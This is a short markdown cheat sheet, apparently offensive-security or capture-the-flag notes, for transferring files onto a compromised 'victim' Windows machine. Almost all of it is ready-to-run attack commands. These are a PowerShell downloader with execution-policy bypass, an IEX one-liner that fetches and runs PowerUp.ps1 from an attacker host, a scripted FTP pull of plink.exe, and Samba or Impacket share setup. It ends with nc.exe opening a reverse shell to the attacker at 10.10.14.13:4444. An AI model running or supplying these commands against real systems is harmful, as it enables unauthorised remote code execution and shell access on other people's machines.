# Transferin Files on Victim Windows
## Web Transfer

### Set Up a Simple Python Webserver on Local Linux machine
```
python -m SimpleHTTPServer 80
python3 -m http.server 80
```

### Download files to victim machine with Powershell
```
echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://192.168.1.101/file.exe" >>wget.ps1
echo $file = "output-file.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
```
```
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```

### Download and Execute powershell script 
```
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13/PowerUp.ps1')"
```

### Via FTP
```
echo open 192.168.1.101 21> ftp.txt
echo USER user>> ftp.txt
echo mysecretpassword>> ftp.txt
echo bin>> ftp.txt
echo GET plink.exe>> ftp.txt
echo bye>> ftp.txt
```
```
ftp -v -n -s:ftp.txt
```

### Via SMB
## Set Up Samba Server on Attacker Linux Machine
>##### Via Daemon
```
apt install samba samba-common
mkdir /var/www/html/pub
nano /etc/samba/smbd.conf  
#add these lines:
[myshare]
path = /var/www/html/pub
writable = no
guest ok = yes
guest only = yes
read only = yes
directory mode = 0555
force user = nobody
```
> ##### Via Impacket Repo
```
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket/examples
python smbserver.py myshare /var/www/html/pub
```
## Use executable file in victim machine
> ##### Attacker machine:
```
cp nc.exe /var/www/html/pub/
```
> ##### Victim machine
```
net use y: \\10.10.14.13\myshare
y:\nc.exe 10.10.14.13 4444 -e cmd 
```
